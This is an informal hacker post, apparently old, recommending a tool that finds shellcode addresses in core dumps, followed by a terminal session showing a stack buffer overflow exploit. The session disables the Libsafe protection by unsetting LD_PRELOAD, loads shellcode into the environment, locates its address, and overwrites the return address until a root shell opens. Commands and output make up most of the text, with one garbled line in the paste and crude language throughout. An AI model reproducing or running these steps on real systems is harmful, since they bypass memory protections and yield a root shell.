

     
      Coolio tool of the month.... its called segment. pretty old but i just found it on packetstorm after some digging. Its useful because who the fuck wants to search GDB for the memory location of your eggshell... so this tool basically finds it for u in a coredump. this is 'not bad' the only downside is that it gets the memory location from a coredump and sometimes you mite not just be doing it FROM a coredump. you can just do getenv() no biggie. dont forget to load the eggshell BEFORE segfault or else the environment data including your eggshell variable obviously wont get written to the dump... to download wget http://atomix.0catch.com/segment. below is how it worked for me... w00t. IM GOING TO SLEEP. NITE NITE. KTHX. and yes i use syslog. SYSLOG OWNS BITCHES...'daemon.alert root' 4 lyfe.  illnix ... # make vuln gcc     vuln.c   -o vuln illnix ... # ./vuln `perl -e 'print "A"x2700'` Libsafe version 2.0.16 Detected an attempt to write across stack boundary. Terminating /root/.../dissembler_0.9/.../vuln.     uid=0  euid=0  pid=18536 Call stack:     0x40016c5c  /lib/libsafe.so.2.0.16     0x40016d8b  /lib/libsafe.so.2.0.16     0x80483dc   /root/.../dissembler_0.9/.../vuln     0x4003e8a3  /lib/libc-2.3.3.so Overflow caused by strcpy() Jul  5 03:29:54 src@illnix libsafe.so[18536]: Libsafe version 2.0.16 Jul  5 03:29:54 src@illnix libsafe.so[18536]: Detected an attempt to write across stack boundary. Jul  5 03:29:54 src@illnix libsafe.so[18536]: Terminating /root/.../dissembler_0.9/.../vuln. Jul  5 03:29:54 src@illnix libsafe.so[18536]:     uid=0  euid=0  pid=18536 Jul  5 03:29:54 src@illnix libsafe.so[18536]: Call stack: Jul  5 03:29:54 src@illnix libsafe.so[18536]:     0x40016c5c  /lib/libsafe.so.2.0.16 Jul  5 03:29:54 src@illnix libsafe.so[18536]:     0x40016d8b  /lib/libsafe.so.2.0.16 Jul  5 03:29:54 src@illnix libsafe.so[18536]:     0x80483dc  /root/.../dissembler_0.9/.../vuln Jul  5 03:29:54 src@illnix libsafe.so[18536]:     0x4003e8a3  /lib/libc-2.3.3.so Jul  5 03:29:54 src@illnix libsafe.so[18536]: Overflow caused by strcpy() Killed illnix ... # unset LD_PRELOAD illnix ... # echo $LD_PRELOAD  illnix ... # ./vuln `perl -e 'print "A"x2700'` Segmentation fault (core dumped) illnix ... # bish3 0x02 Bish loaded into enviroment illnix ... # ./vuln `perl -e 'print "A"x2700'` Segmentation fault (core dumped) illnix ... # segment         Segment probe v1.0 by sectorx of xor (http://xorteam.cjb.net) - thanks to duke for helping me start coding this  usage: segment elf string to search illnix ... # segment core BISH Segment probe v1.0 by sectorx of xor (http://xorteam.cjb.net) - thanks to duke for helping me start coding this  ELF Binary header: ident = "ELF" type = Core  Searching segments for requested string ... *** Query found: Segment type  : Loadable program segment Segment start : 0xbfffe000  Location      : 0xbffffc40  Offset        : 7232 illnix ... # ./vuln `perl -e 'print "\x40\xfc\xff\xbf"x106'`                              Segmentation fault (core dumped) illnix ... # ./vuTPS$°erl -e 'print "\x40\xfc\xff\xbf"x105'`                              BISH=Phn/shh//biã     ÷ÿ¿Ð¦ sh-2.05b# yayyyyyyyyyyy it werked... i cut out all the previous tries. about 30. sh-2.05b# 
     
    
